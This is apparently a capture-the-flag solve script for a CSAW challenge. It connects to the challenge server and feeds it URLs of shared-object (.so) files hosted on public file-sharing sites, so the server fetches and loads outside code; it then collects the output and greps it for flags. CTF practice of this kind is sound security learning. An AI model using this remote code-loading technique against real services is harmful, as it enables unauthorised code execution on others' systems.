#!/usr/bin/env python3
from pwn import *
import re, time, subprocess, socket, os

HOST='rev.chal.csaw.io'
PORT=8000
URLS=['https://d.uguu.se/ORZgstzv.so','https://files.catbox.moe/m71mfv.so']
TIMEOUT=120


def resolve_ips(host):
    ips=[]
    try:
        out=subprocess.check_output(['dig','+short',host],stderr=subprocess.STDOUT,text=True,timeout=15)
        for line in out.splitlines():
            line=line.strip()
            if re.match(r'^\d+\.\d+\.\d+\.\d+$',line):
                ips.append(line)
    except Exception:
        pass
    try:
        infos=socket.getaddrinfo(host,PORT,type=socket.SOCK_STREAM)
        for i in infos:
            ip=i[4][0]
            if ip not in ips and ':' not in ip:
                ips.append(ip)
    except Exception:
        pass
    return ips


def attempt_connect(target_host):
    for url in URLS:
        try:
            io=remote(target_host,PORT,timeout=20)
            io.recvuntil(b'>>>',timeout=10)
            io.sendline(url.encode())
            data=io.recvrepeat(TIMEOUT)
            io.close()
            return url,data,None
        except Exception as e:
            err=str(e)
            try:
                io.close()
            except Exception:
                pass
    return None,b'',err


def grep_flags(blob):
    txt=blob.decode('latin-1','ignore')
    pats=[r'flag\{[^}]+\}',r'csaw\{[^}]+\}',r'.{0,40}flag.{0,40}\{[^\n]{0,200}\}']
    out=[]
    for p in pats:
        out += re.findall(p,txt,re.I)
    # unique preserve order
    seen=set(); uniq=[]
    for x in out:
        if x not in seen:
            seen.add(x); uniq.append(x)
    return uniq,txt


def main():
    all_data=b''
    logs=[]

    # direct host retries with backoff
    for i in range(4):
        url,data,err=attempt_connect(HOST)
        logs.append(f'direct_try_{i}: url={url} len={len(data)} err={err}')
        all_data += data
        if data:
            break
        time.sleep(2**i)

    # dig fallback to IP connect
    ips=resolve_ips(HOST)
    logs.append('resolved_ips='+repr(ips))
    if not all_data:
        for ip in ips:
            for i in range(2):
                url,data,err=attempt_connect(ip)
                logs.append(f'ip_try_{ip}_{i}: url={url} len={len(data)} err={err}')
                all_data += data
                if data:
                    break
                time.sleep(2**i)

    open('out.bin','wb').write(all_data)
    open('attempt.log','w').write('\n'.join(logs)+'\n')

    flags,txt=grep_flags(all_data)
    print('FLAGS:',flags)
    print('DATA_LEN',len(all_data))
    if len(all_data):
        print(txt[:1000])

if __name__=='__main__':
    main()

